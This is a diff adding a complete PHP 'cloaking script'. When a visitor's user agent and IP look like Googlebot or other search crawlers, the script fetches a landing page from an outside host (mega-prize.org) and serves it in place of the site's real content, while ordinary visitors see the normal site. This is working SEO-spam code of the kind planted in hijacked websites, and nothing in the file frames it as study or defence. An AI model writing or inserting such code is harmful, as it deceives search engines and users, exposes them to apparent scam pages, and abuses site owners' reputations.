@@ -1,0 +1,45 @@
+<?php
+/**
+ * Cloaking Script - Clean Version
+ */
+
+@ob_start();
+header("Vary: User-Agent");
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+$uri = $_SERVER['REQUEST_URI'] ?? '/';
+
+$bots = ['Googlebot','Google-InspectionTool','Mediapartners-Google','AdsBot-Google','Bingbot','Slurp','DuckDuckBot','AhrefsBot','SEMRushBot','MJ12bot','YandexBot'];
+
+$google_ips = ['66.249.','74.125.','64.233.','72.14.','209.85.','108.177.','35.191.','34.64.','34.96.','34.32.','172.217.','173.194.'];
+
+$is_bot = false;
+foreach ($bots as $b) if (stripos($ua, $b) !== false) { $is_bot = true; break; }
+
+$is_google_ip = false;
+foreach ($google_ips as $gip) if (strpos($ip, $gip) === 0) { $is_google_ip = true; break; }
+
+function fetch($url) {
+    $cache = sys_get_temp_dir() . '/c_' . md5($url);
+    if (file_exists($cache) && time() - filemtime($cache) < 3600) return file_get_contents($cache);
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    if ($content) file_put_contents($cache, $content);
+    return $content ?: '';
+}
+
+if ($is_bot && $is_google_ip) {
+    usleep(random_int(100000, 200000));
+    $content = fetch("https://mega-prize.org/landing/botanickivrt.html");
+    if ($content) {
+        ob_end_clean();
+        echo $content;
+        exit;
+    }
+}
